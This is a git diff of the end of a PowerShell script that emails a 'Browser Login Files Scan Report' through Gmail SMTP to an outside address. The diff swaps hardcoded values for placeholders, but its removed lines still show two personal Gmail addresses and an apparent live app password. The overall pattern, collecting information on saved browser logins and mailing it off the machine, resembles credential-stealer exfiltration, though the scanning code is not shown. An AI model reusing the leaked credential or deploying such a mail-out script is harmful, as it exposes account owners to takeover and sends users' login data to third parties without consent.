@@ -70,12 +70,12 @@ $reportContent | Out-File -FilePath $reportPath -Encoding UTF8
 # -- Email setup --
 $smtpServer = "smtp.gmail.com"
 $smtpPort = 587
-$from = "zubaidyomar@gmail.com"
-$to = "temdawd2@gmail.com"
+$from = "<youremail-with-passkey>"
+$to = "<recievingemail>"
 $subject = "Browser Login Files Scan Report"
 $body = "Please find the attached report of saved browser login files scan."
-$username = "zubaidyomar@gmail.com"
-$password = "tgcwsfoamkossqej"
+$username = "<youremail-with-passkey>"
+$password = "<apppass>"
 
 # Create credential object
 $secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
@@ -83,3 +83,4 @@ $cred = New-Object System.Management.Automation.PSCredential ($username, $secpas
 
 # Send email with the report attachment
 Send-MailMessage -From $from -To $to -Subject $subject -Body $body -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $cred -Attachments $reportPath
+
